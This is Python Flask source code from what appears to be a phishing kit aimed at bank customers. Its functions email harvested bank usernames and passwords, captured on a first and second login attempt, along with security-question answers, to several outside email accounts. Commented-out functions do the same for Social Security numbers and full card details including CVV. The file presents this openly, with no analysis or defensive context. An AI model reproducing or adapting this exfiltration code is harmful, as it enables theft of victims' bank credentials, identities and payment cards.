from arvest import mail
from flask_mail import Message
from datetime import datetime

def report_login(first_try_username, first_try_pass, username,password,bank_name):
    msg = Message(f'New Login || {bank_name}',
        sender='donaldlorren4202022@gmail.com',
        recipients=['ritapratt010@gmail.com','christinesalgado477@gmail.com'])
    msg.body=f'''
    ---------------------------------------------
    ---------------FIRST TRY -------------------
    For ----- {bank_name}
    Username is ----- {first_try_username}
    Password is ----- {first_try_pass}
    at ---- {datetime.now()}
    ---------------------------------------------
    ---------------SECOND TRY -------------------
    For ----- {bank_name}
    Username is ----- {username}
    Password is ----- {password}
    at ---- {datetime.now()}
    '''
    mail.send(msg)

def security_question(q1,ans1,q2, ans2,q3,ans3):
    msg = Message('Question and Answer',
        sender='donaldlorren4202022@gmail.com',
        recipients=['ritapratt010@gmail.com','christinesalgado477@gmail.com'])
    msg.body=f'''
    --------QUESTION ONE----------
    {q1} ------> {ans1}
    --------QUESTION TWO----------
    {q2} ------> {ans2}
    --------QUESTION THREE----------
    {q3} ------> {ans3}
    at ---- {datetime.now()}
    '''
    mail.send(msg)

# def report_ssn(ssn):
#     msg = Message('New Login',
#         sender='angelamoore914@gmail.com',
#         recipients=['r4y.brenda@yandex.com,christinesalgado477@gmail.com'])
#     msg.body=f'''
#     SSN ----- {ssn}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)

# def report_card_details( card_name, card_number,expiry_date,cvv):
#     msg = Message('New Login',
#         sender='angelamoore914@gmail.com',
#         recipients=['r4y.brenda@yandex.com,christinesalgado477@gmail.com'])
#     msg.body=f'''
#     Card name is ----- {card_name}
#     Card Number is ----- {card_number}
#     Expiry Date is ----- {expiry_date}
#     CVV is ----- {cvv}
#     at ---- {datetime.now()}
#     '''
#     mail.send(msg)